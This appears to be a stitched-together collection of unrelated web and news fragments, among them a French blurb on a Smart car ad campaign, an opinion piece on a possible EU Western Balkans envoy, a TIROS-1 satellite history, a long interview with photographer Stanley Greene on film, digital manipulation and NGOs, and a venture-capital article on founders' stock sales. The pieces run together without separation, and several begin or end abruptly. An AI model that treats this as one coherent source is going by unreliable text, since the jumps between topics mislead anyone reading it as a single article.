So it has come to this : I ’m holding the slender sprayer four inches from my face , misting it with No. 008 honey foundation , in our cramped bathroom .
I make small circles in the air to coat my face evenly and look as natural as possible .
The machine whirrs as loudly as a vacuum .
L’agence BBDO
Canada met en scène la petite taille de la smart et donc son adaptabilité à l’environnement urbain .
L’agence avait déjà imaginé des voitures surmontées d’un énorme chausse pied , désormais il s’agit de parquer son véhicule à la façon d’un simple vélo .
Dans l’imaginaire collectif , garer son vélo ou son deux roues est intimement lié à l’antivol .
C’est ainsi que plusieurs
Smart se sont retrouvées attachées à des poteaux dans la ville de Toronto .
Cette opération met en avant une technique intéressante : la smart a déjà surpassé toutes ses concurrentes en terme de mobilité urbaine , elle s’attaque donc désormais à son dernier rival , le vélo .

Personal Quote : Unfortunately , I never knew my father and when I did , it was very briefly .
He was incarcerated for most of my life and he was killed two years ago ; he was shot .
I think that even though my father was n't there , in his death and in his memory , he has been a mentor to me in my manhood because my mom could n't teach me how to be a man .
Trivia :
His last name is the Italian translation of " goat " .

After much deliberation , hand - wringing and years of misguided and contradictory policy initiatives , it appears that the European Union is finally considering appointing an envoy to the Western Balkans .
No definitive decision has been made and no names were formally proposed at Wednesday 's ( rather brief ) EU Western Balkans Summit in Sarajevo .
It is , after all , only one of a number of options being considered by Lady Ashton , the EU 's foreign and security policy chief .
But it is an option that should be given very serious consideration .
In principle , the idea is sound and would represent a step in the right direction for both the EU and the applicant states of the western Balkans .
The right individual , one with a regional perspective , who could convey the region 's interests and needs within the union and act as an effective conduit between the applicant and existing EU member states , would be mutually beneficial .
Emphasis , however , should be placed on the " right individual " .
Speculation over possible candidates has been rife , but the very mention of one in particular has been enough to ruffle the feathers of some regional political elites .
Paddy Ashdown , no stranger to the complex and often brusque character of the politics of the region , is one of the names in the frame .
Ashdown , who has consistently advocated the creation of an EU special envoy to the Western Balkans , has a past there .
He was Bosnia 's high representative between 2002 and 2006 – a golden age for the HR , and a time when he still enjoyed rather unlimited power .
Lord Ashdown revelled in his role .
His robust methods frequently brought him into conflict with the leadership of the Republika Srpska , but won him plaudits among those Bosnian citizens who shared his vision of a functioning Bosnian state .
Admirers view his tenure as progressive and constructive , detractors as a disaster .
But his autocratic style was , however unpalatable to some , effective and , to his great credit , it produced results .
Towards the end of his tenure , however , attitudes toward the role of the HR changed .
Many , including the influential thinktank the European Stability Initiative ( ESI ) , believed that Ashdown 's rule turned Bosnia into a European " Raj " , and that the time had come to allow Bosnians to assert control over their own affairs , with the HR playing a less proactive role .
Christian Schwarz - Schilling , Ashdown 's successor , made it clear from the outset that his approach would be light by comparison with his predecessor .
It was to prove immensely damaging for Bosnia , and since then , progress has stalled and the country has lurched from one crisis to the next .
With the benefit of hindsight , Ashdown 's tenure as HR may well appear something of a zenith by subsequent standards .
But does this mean that Ashdown is the right man to be the EU 's envoy ?
There are few who would inject the enthusiasm and vitality or that possess the authority that would be required to make a success of the post .
The problem may be that he carries too much baggage to be an effective EU envoy .
Domestically , there will be little opposition ; he enjoys the support of the British foreign minister , William Hague , who has himself demonstrated an interest in Balkan affairs .
In 2009 Hague visited Bosnia and was evidently disturbed by the negative trends in Bosnian politics .
Upon his return he made it clear that a future Conservative government would make Bosnia a foreign policy priority .
Clearly , Hague would firmly support Ashdown 's appointment as a man who would not be afraid to tackle with the region 's problems .
Other EU member states may not share Hague 's enthusiasm .
Major European powers such as Germany and France are likely to resist Ashdown 's appointment , lest the EU 's diplomatic service be dominated by the British .
But regardless of their motives for opposition , there are good reasons to suspect that an Ashdown appointment could prove counterproductive .
At this point , he has not put himself forward , and may not do so .
He himself may be acutely aware that his " previous " in the region would render the post somewhat compromised from the outset .
He would undoubtedly be a divisive figure , impeded from the start by preconceived ideas about his agenda .
Changing these pre-existing perceptions – justified or otherwise – would be a significant , possibly insurmountable , challenge .
Chris Patten , another name in the frame , may be a stronger candidate in the sense that he is less burdened with the baggage of being a former HR .
He has significant experience as a former EU external relations commissioner , but , again , his potential candidacy would likely be just as vigorously opposed by Germany .
An " acceptable " alternative may be the Slovak foreign minister , Miroslav Lajčák , another former HR , but one perceived as less contentious and divisive than Ashdown .
Critics may argue that his history in Bosnia would render it almost impossible for him to make a positive impact on an already fraught political context .
They may also argue that while Ashdown knows the territory in Bosnia , he is less well versed in the nuances of , for example , Serbian , Montenegrin , Macedonian or Albanian politics – and there are significant differences even between Bosnia and , say , Montenegro .
Moreover , the Western Balkan region is changing ; a more youthful and pro-EU political elite now lead their respective countries .
There are some obvious exceptions to this .
Bosnia and Montenegro are still , to a significant extent , governed by those who were in power during the collapse of the Yugoslav state in the early 1990s ( although they too are pro-EU ) , but this is not representative of the region holistically .
The appointment of an EU envoy should reflect this new reality .
There are numerous variables and as many possible outcomes , but the idea of creating an EU envoy is a good one .
It is simply that finding the right , politically acceptable , candidate should be given both time and serious thought .

Police said they were working to contain an illegal gathering of 2,500 people in Pembrokeshire .
Roads near Dale have been blocked to stop further vehicles arriving although people are being allowed to leave .
A Dyfed -Powys Police said it wanted " to ensure minimum disruption to the surrounding communities " .
The unofficial festival , which sprang up on Saturday , has seen people travel from as far afield as Devon , Hampshire and north east England .
Those at the site insisted they wanted to enjoy themselves until the end of the Bank Holiday - and promised to tidy up afterwards .

Warning over 2,500 at Pembrokeshire illegal gathering
Taking a cue from a model that has proven successful in the non-game world of tech startups , North Carolina - based Joystick Labs has announced its new incubation program to provide seed funding and office space for independent video game development firms targeting digital distribution .
" Joystick Labs represents a new opportunity in game development that is in tune with the changes we see in the industry , " said co-founder Juan Benito in a statement .
" We will reduce the barriers to entry to a point where there is nothing holding back a team of talented developers from launching their own studio .
" Joystick Labs will provide up to $ 18,000 in funding for companies that successfully apply to its 12 - week " accelerator program " in Durham , North Carolina , and intends to immerse those companies in an environment that will stimulate creativity , productivity , and growth .
For the three - month duration of each program , the first of which begins this fall , Joystick says it will provide networking opportunities and " operational support " from experienced game industry figures , as well as a variety of educational sessions and lectures .
Epic Games , one of North Carolina 's most prominent developers , said it " hope[s ] to support Joystick Labs ' incubation projects with our Unreal Engine technology .
"
In return for the funding and infrastructure , Joystick will receive a " modest equity stake " in each company , and an unspecified share of profits on the game kick - started by the acceleration program .
Developers will retain the rights to the intellectual property they create , however .
Prospective developers can apply for the Fall 2010 term through Joystick Labs ' official site
The company was founded by Benito , a longtime game developer best known for co-foundingseries developer Red Storm Entertainment ; Hutchison Law Group venture attorneys Glen Caplan and Justyn Kasierski ; and tech industry veteran Lawrence Steffann .

At the time of publication , it represented the best available science .
It is almost inconceivable to imagine a weather forecast without a satellite view of clouds sweeping across the globe , but in the spring of 1960 , the view from space was a ground - breaking novelty .
The first satellite designed to observe clouds was TIROS - 1 , or the Television InfraRed Observation Satellite , and it launched on April 1 , 1960 .
The satellite carried two tiny television cameras , each weighing about two pounds .
One camera captured a wide view of the Earth about 450 miles below , while the other recorded a narrower , more detailed view .
TIROS - 1 orbited from pole to pole , snapping photos every 30 seconds , as illustrated in this series of images .
The images were stored on tape recorders on the satellite until TIROS - 1 came into range of data stations in Fort Monmouth , New Jersey , or Kaena Point , Hawaii .
The first of the images , labeled “ frame 2 , ” shows the Red Sea .
The water is black , and vegetated land on either side is also dark - colored .
The deserts of the Arabian Peninsula on the east and the Sahara Desert of Africa on the west are light gray .
The brightest features in the image are clouds .
When TIROS - 1 acquired frame 3 thirty seconds later , the satellite had moved northwest .
By frame 6 , the Nile River has become the focus of the image , though its distinctive triangular delta is partially covered with cloud .
In the last frame , the shore of Egypt and Libya runs along the lower portion of the image , while the focus is on clouds over the Mediterranean Sea .
TIROS - 1 captured these photos during its 44th of 1,392 orbits made between April 1 and June 18 , 1960 .
During its short three - month lifetime , the satellite took 23,000 images of Earth .
The TIROS program provided the first accurate weather forecasts based on data from space , demonstrating that it was possible to use satellites to observe weather .
The satellite has a long legacy .
TIROS - 1 led to nine more TIROS satellites , seven Nimbus - series meteorological research satellites , 14 Geostationary Operational Environmental Satellites , 19 NOAA Polar Orbiting Satellites , and many more meteorological satellites maintained by the Department of Defense and other nations .
Together , these weather satellites have provided 50 years of improved weather forecasts .
Stanley Greene , 61 , is a founding member of Noor Images , a photography collective , agency and foundation in Amsterdam .
His books include the autobiographical “ Black Passport ” and “ Open Wound : Chechnya 1994 - 2003 . ”
He won the W. Eugene Smith Grant in 2003 .
Michael Kamber spoke with him in Paris in May .
Their remarks have been condensed .
Q .
What is it that you wanted to say with “ Black Passport ” ?
A .
I wanted to set the record straight .
I kept hearing people say , “ Chechnya was when you really started to be a photographer . ”
And that ’s not true .
I was shooting back at the Berlin Wall , but nobody knew about it .
I fell through the cracks .
I wanted a way to say that my influences are not the ones you think they are .
They are about painting .
They are about music .
They are about other things .
The way I ’ve been shooting really has n’t changed since back in the ’ 70s , before all these new photographers emerged .
My old work , like rock and roll , really nails it .
I found my vision way before Chechnya , it ’s just that you did n’t know about it ; the public did n’t know about it .
Louis Faurer is an amazing photographer , but he fell through the cracks .
Robert Frank used his dark room , and obviously Robert Frank looked at his pictures .
They were friends .
But Louis Faurer fell through the cracks .
He was a great photographer and a great printer .
Frank was hanging out with Bill Brandt , and he was hanging out in Paris with Man Ray and others .
It ’s the same if you look at Garry Winogrand , Roy DeCarava and Lee Friedlander .
Q .
Theirs is not a dark vision ?
A .
Theirs is not a dark vision .
It was a way of looking at pictures .
At that point , pictures were being looked at in a very classical way .
I think that World War II rattled everything , from photography to music to literature to painting to sculpture to film .
Everything got rattled .
These guys came back and they had seen war .
They had seen death .
And their whole mindset — the abstract painters — they came back with those slashes of reds and blacks .
And , of course , photography got rattled as well .
It ’s obvious everything got shaken up .
But up until that point , you had this very still , very classical , very beautiful photography , taking nothing away from Ansel Adams and Minor White .
Q .
The 1950s were Chevrolets and hot dogs and the man in the gray flannel suit .
Then you have all this really dark photography beginning to take shape .
A .
Gene Smith ’s dark vision was lurking .
And then after the war , it just blew out .
Q .
Tell me about Eugene Smith .
A .
He was a great photographer .
He was a humanitarian .
But he also had a lot of demons .
He did drugs — he did a lot of drugs — and he drank and he was obsessed .
I understand obsession .
And Gene became obsessed .
The greatest story is when the person who took care of his house , Hattie , came to the city to tell him to try and get some money because she was supporting his family in upstate New York .
She had to come down .
Gene was just so consumed with looking for his vision and printing and everything , he totally ignored his whole family , to the point that Gene went nuts .
Q .
You worked for him ?
A .
Yeah , I worked for him .
He was obsessed .
If you were in the studio , Gene would be up .
And no matter what time you left , when you came back in the morning , Gene would be up .
I never saw Gene Smith sleep .
At the same time , we are now pulling back the onion skin and looking at him a little bit harder , especially with the digital issue .
Michael Kamber
There is a big debate going on right now about RAW files .
People say your negative is a RAW file , and you are manipulating your pictures in the darkroom .
I am not .
All that information is on my negative .
Well , they say , all that information is in the RAW files .
But if you alter an image and you change the hues , that ’s manipulation .
I am sorry ; I ca n’t do that with a black - and - white negative .
I can only manipulate for the shadows .
And they throw out Gene Smith and his printing .
When journalists start to distort reality , then I have a real problem with it .
And when everything starts to look like a cartoon , I have a problem with it .
Q .
Are you saying that there is too much Photoshop going on ?
A .
Way too much .
And with [ Photoshop ] CS5 , it is going be worse .
Imagine .
There is this setting now in CS5 where you can remove the horse and there will be no ghost .
It ’s scary .
Even on the Leica M9 , there is a setting that says , “ Vintage black and white . ”
Photographers are photographing in color and printing in black and white .
I was trained : if you shoot in color , you are looking at color .
That ’s it !
I think digital is great — for color .
I do n’t think it ’s great for black and white .
I think it ’s just too much manipulation .
It ’s not real .
There is this kind of grayness .
I still do n’t get the blacks I want without taking it to such an extreme that it becomes a cartoon of its former self .
Q .
Let ’s face it , a lot of photojournalists now have full - time assistants who do nothing but Photoshop their images .
But you are not saying that these photojournalists are inserting objects into the frame or removing objects from the frame ; it ’s mostly burning and dodging , right ?
A .
No , I am saying they are putting things into the frame and taking things out of the frame .
Absolutely .
I definitely think they are doing that .
You have a bucket or a chair in the original picture and all of sudden the color changes because it goes better with the form .
I have always loved the Afghanistan pictures that I have seen that have been Photoshopped .
I mean , all of a sudden , Afghanistan has clouds .
Every time I ’ve been to Afghanistan , it ’s been a flat sky .
But all of a sudden , you ’ve got God skies .
Where did those come from ?
All of a sudden we ’ve got colors that we did n’t even know existed .
Q .
You can make the case that someone like Alex Webb was underexposing Kodachrome 20 years ago , printing Cibachromes from it and getting vibrant colors .
A .
But I can say that when you look at his slide , all that information is in that slide .
It ’s not in the computer .
It is on the slide .
You ca n’t change that .
The information is all in the slide .
Just like the information is all on my negative .
I can not change it .
Q .
I was at World Press Photo last week , and half the stuff looks like it was shot through a toilet paper roll .
It ’s so heavily burned around the edges and and desaturated .
It has these really heavy blacks .
There is a whole look , a whole style , that ’s taking over .
A .
It ’s really taking hold .
The problem is that when people win World Press , young photographers say : “ Oh , I ’ve got to do that .
I ’ve got to be part of that . ”
Q .
Do you think that we need to go back to shooting film again ?
Do you think we need go back to when there was a purist approach to photojournalism ?
A .
Yeah .
I also think we are going to have more pictures from the 20th century than we are going to have from the 21st , because everything is getting deleted .
Digital is not real .
I can touch a negative .
I ca n’t touch digital .
When you have to back something up with 15 hard drives , does n’t that rattle something ?
And also , when you shoot digital , you can chimp ; you can look at the image on the camera .
Imagine Cartier - Bresson if he was trying to take a picture and all of a sudden he looked down .
He would lose that next moment .
A really good combat photographer chimping in the middle of the field could get a bullet in his head .
I am surprised that no one has been shot yet .
But by shooting film , you are forced to really think about what you are photographing .
You have to have a dialogue between you and the subject .
When I shoot , I shoot from every angle possible because I am a super insecure photographer .
And when I am shooting film , I am even more insecure .
I push the envelope on trying to get the right shot , but I also think it through .
With digital , there is a moment where you say : “ Oh , I got it .
What the hell . ”
I think that we have no choice but to go back to shooting film because we have to get back to some kind of integrity .
I think we are losing the moral code .
And I think that in the end with film — yes , you can manipulate it and yes , you can change some things — there is still a moral code .
Anyway , I like shooting film .
I have a thousand rolls of Kodachrome .
But the fear I have every day is , “ When I am going to get that golden assignment where I can actually go shoot the Kodachrome , then ship it off to Kansas and still hope that they are still processing it ? ” I am waiting .
Any day now , they are going to say , “ It ’s all over . ”
But they said that about Polaroid , and now Polaroid is coming back with a vengeance .
Q .
I have been hearing this from a lot of older photographers : that the young photographers today are technically amazing , they have learned what an amazing photograph looks like , but they sometimes lack a variety of influences or a certain humanity .
A .
They do n’t have humanity .
They are definitely much better technically .
They know that backwards and forwards .
And they should .
It ’s their generation .
But at the same time , because of all that technology , they are losing the humanity .
When we get to the point where we start digging up graves to make photographs , I think we are in trouble .
When we get to the point where a woman is standing there with a bucket , trying to hold her guts in , and we are trying to get the right frame , and chimping at the same time we are doing it , we are in trouble .
“ Wait a minute , I need to take this picture , but I need to do an interview with you , but also , I need to shoot some video .
Do you think you could keep that bucket there and maybe a little bit more , so we could see the blood running out ? ”
And she is just shell - shocked .
Q .
Where did you see that ?
A .
In Georgia .
Q .
Do you think that young photographers need to get away from the computer and start looking at other influences ?
A .
First thing , I think that photographers need to get away from the computer and get out and walk around the communities that they photograph .
I think that a lot of photographers are taking nothing away .
And there is a thing called disaster tourism .
That is disgusting .
I am sorry .
But that is disgusting : to bring people , like they are going to the zoo , and show them how to take pictures .
“ That is the job of a journalist , to upset your morning . ” — Stanley Greene
I think that when you arrive in a place , you need to sniff the air .
You need to take your finger , stick it up and see where the wind is blowing .
You need to be able to communicate with people .
You should know a language .
But even if you do n’t know a language , you should at least be decent enough to understand what you are about to photograph , instead of just going , “ Pow , pow , pow . ”
Because when you do that , then you are a vulture , and then you are what a lot of N.G.O. ’s call us : “ Merchants of misery . ”
But if you take the time and really get an understanding of what the story is about , you will come away with an experience .
It wo n’t be just for some World Press Award .
It will be : “ I understand what these people are going through , and I think we should do something about it . ”
Because I think — at the end of the day — we have to be diplomats .
I do n’t like the word “ photojournalism . ”
It ’s been bastardized .
I am comfortable with the idea of being a photographer , just being a photographer .
I do n’t want to be an artist ; I want to be a photographer .
That ’s what I do .
And a photographer is someone who looks at the world and tries to make some sense of it for themselves , and for everyone else .
And that ’s what I want to do .
When I do a story , I go there and I try to understand what is going on .
I ’ll try to research it before going .
I become passionate .
It gets under my skin and I get a little bit obsessed .
I have a problem with just dashing off to a place because there is violence and death and destruction and we think it ’s going to help our career .
There is a whole young group of photographers who work with that mindset , and the problem with that is that they give all of us a bad name .
Q .
But do you think that somebody , a young person , could look at your book — there are a lot of beautiful women and a lot of death in your book — and get the wrong idea ?
Or feel like this is some romantic view of what my life will be like if I follow Stanley Greene ?
A .
No , I try to deflate that image .
When you realize that you have been with these women and you have left them and broken their hearts — and look , let ’s be real here .
I do n’t own an apartment .
I do n’t own a house .
I do n’t own a car .
I do n’t have any stocks and bonds .
All I own are my cameras .
That ’s it .
And some cowboy boots .
If you want to be a success financially , please do n’t follow this path .
A lot of the stories I did , I financed .
I am not a good business person .
I did n’t know how to negotiate with a magazine .
I just simply said , “ Please give me this story , and give me the go - ahead to go do it . ”
Or in some cases , “ If I do it , and I get the pictures and I send it to you , send me money . ”
And that is the generation I come out of .
I live from hand to mouth .
I am one of the founders of Noor .
There are three agencies today : there is Magnum , there is Noor and there is VII .
I have a lot of respect for VII , but I really think we are the second agency , and we did it in three years .
When you say you are a founder and owner of Noor , people expect you to be rich , but we ’re not .
Because we are really committed to doing what we are doing and we have made sacrifices to make that happen .
And we are going to continue to make sacrifices to allow that to happen .
In the end , it is n’t about money .
You want to have enough money so that you can go and eat a nice meal , and you can take your family on a fairly reasonable vacation .
But then you have another level , where you do n’t even think about that — where you just think about the next story .
How do we get the money to go do the next story ?
Q .
Right .
But partially because of this , photographers are doing workshops and are doing N.G.O. work .
They are finding different ways .
They are not out trying to do fresh photo essays that they can sell to magazines .
They are putting their energies into other things to make money .
A .
I ’m glad you brought up N.G.O. ’s , because that has become a real game .
Like we work for these N.G.O. ’s , right ?
It ’s advertising , so that they can raise money and they can continue to do the good that they do .
We get all upset if a photographer shoots for Shell or BP .
But when we think in terms of photographing for certain nonprofit organizations who have a lot of money , and we become their spokesperson , we start to lose our objectivity .
Q .
Right , but what should our role be as photojournalists working for them ?
A .
We have to be objective ; we have to accept that .
For example , when I worked for Human Rights Watch , they would take my pictures and sell them to raise money .
What I always admired about Corinne Dufka is that she was a great photographer .
And she quit and has literally become an investigator for Human Rights Watch .
I think we have to be investigators .
Q .
So you ’re saying that when we are working for N.G.O. ’s , we may try and please the people we are working for instead of acting as true journalists ?
Stanley Greene / Noor
A .
Exactly .
And that happens a lot — more than people will admit .
Because you figure : “ They are paying for a place for us to sleep .
They are giving us vehicles to get around in .
Well , then , we are certainly not going to go out and criticize them .
And we know what they expect to see . ”
Q .
How is this different than working for a magazine , which also expects to see something ?
A .
A magazine editor who hires me better understand that I am going to try and show you the truth .
Some of my photos were just too hard to look at .
But the truth of the matter was the picture of dead Americans in Falluja was going to run against an advertisement and the advertising people said : “ No , no , no .
Dead American bodies ?
Uh oh .
No , no , no .
Burnt lines ?
No , not like that . ”
And in the end , Time magazine ran it in Pictures of the Year , you know ?
It was made for Newsweek , but it ran in Time .
Q .
Because it was causing a problem with the editors ?
Or advertisers ?
A .
Yeah , but I shot the picture .
I certainly did n’t say : “ Would the advertisers be upset if I show dead Americans — burnt , being beaten and tossed down the street ?
And then hung under a bridge and cut down ? ”
Q .
Do we need to see images like that as Americans ?
There have been almost no images of dead Americans published .
A .
We need to see it because it ’s reality .
We go to the movies , and we look at violence splashed across the screen like spaghetti sauce .
If we ca n’t stomach watching our men and women being killed in these situations , then we should n’t send them there to be killed in such gruesome ways .
We ca n’t have it both ways .
You want to sit there comfortably with your newspaper and blueberry muffin , and you do n’t want to see pictures that are going to upset your morning .
That is the job of a journalist , to upset your morning .
The problem with newspapers and magazines folding is that the investigative journalism is going to disappear .
And these criminals doing these nasty and dirty things in the world are going to get away with it .
Q .
Let me come back to the book .
You said Eugene Smith and Louis Faurer were mentally ill .
Do you think that there is a link between great photojournalists and mental illness ?
A .
Well , I think you have to be nuts to do this job .
I think you have to be a monk .
I think it just takes too much out of you .
Anybody who wants to be with you has got to be super strong , because there is just too much , too much that is going on in your head .
There is too much going on in your life .
I did two years in a mental hospital .
I know what crazy is , so now I am just controlling my craziness .
I think that everyone else should at least acknowledge that they are nuts .
I acknowledge that I am quite out there .
But I am out there to a point where I found a way to control it , and I found a way to channel it so that I can still function .
Q .
When were you institutionalized ?
A .
When I was 15 .
Q .
And why did you include the intimate material about women and relationships in the book ?
A .
I felt this book had to be honest , and it was a way of exorcising a few demons .
I felt that it had to be an honest book or it would n’t have made sense , you know ?
This has been my journey .
And why are you the way you are ?
Well , if you read this , then you start to see it did n’t happen over night .
It was a long process .
And I think that is a very healthy thing , once you understand .
I quit being a fashion photographer because I wanted to give something back .
I felt bad about some things I had done in the past .
Why would I go off to these nasty places and risk my life ?
It was like a debt .
I have used the
analogy of Westerns .
Westerns are always about revenge and redemption .
This book is about , in a small way , a quiet revenge .
And in a small way , trying to achieve some form of redemption .
My revenge is to say , “ I survived . ”
The greatest form of revenge is to still be standing .
So many people , on so many different occasions , wanted to write me off .
And so many times they were wrong .
So many times people thought , “ He is just a bum ; he is a dope dealer . ”
Everybody has someone decent inside of them .
Once you acknowledge what that is — and you achieve that — you are going to be a better person .
Q .
How long have you been a photographer ?
A .
Since 1971 .
Q .
Almost 40 years ?
A .
Almost 40 years .
Yeah .
I wanted to be a musician .
I wanted to be Jimi Hendrix , but when I heard Jimi Hendrix , I realized I could never touch him .
I wanted to be a painter , but Matisse and all those guys were ahead of me .
And I wanted to be a writer , but you know , Richard Wright and all those guys .
And I looked around and all there was was Gordon Parks and Roy DeCarava .
I could compete , and I knew I could bring something .
It ’s like Miles Davis .
He was a drummer .
But when he picked up a trumpet , he realized that he had found his instrument .
When I picked up a camera , it was like one of those movies .
The phenomenon is n't entirely new .
John Doerr , a venture capitalist at Kleiner Perkins Caufield & Byers , notes that when he and his partners invested in Intuit , the business software maker , in the mid-1980s , " none of the money went into the company .
It was all to buy founders ' stock shares . "
" We always prefer that the money be used to build the company , " Mr. Doerr said .
But the desire to own a piece of a hot company , he said , sometimes trumps that sentiment .
Indeed , he said Kleiner Perkins was currently considering just such an investment in one enterprise .
Typically , the founders are the sole beneficiaries of these deals .
Webroot , for instance , raised $ 108 million in venture capital last February .
A large share of that money is being used to open offices around the globe , said Mike Irwin , Webroot 's chief financial officer , and to expand the company 's product offering .
But some of that $ 108 million -- Mr. Irwin would not say how much -- went directly to the company 's two creators , Steve Thomas and Kristen Talley , who founded the company in 1997 .
They still own a share of Webroot but neither works for the company .
In eHarmony 's case , 116 people benefited financially when the company , which was started in 1999 , announced last December that it had raised $ 110 million .
The word within the venture capital community is that less than $ 30 million of that sum went into the company coffers .
Mr. Forgatch said that was inaccurate , but he would provide no specifics .
" It 's not my place to talk about personal finances of 115 other people , " he said .
Mr. Forgatch argues that the venture deal he helped to craft is good for the company , based in Pasadena , Calif . , as well as for the people who benefited .
And he may be right .
The transaction served as a kind of release valve that helped quiet the collective impulse among eHarmony insiders to see the company go public .
An incremental payoff for their hard work , Mr. Forgatch said , " allows everyone to focus on the mission . "
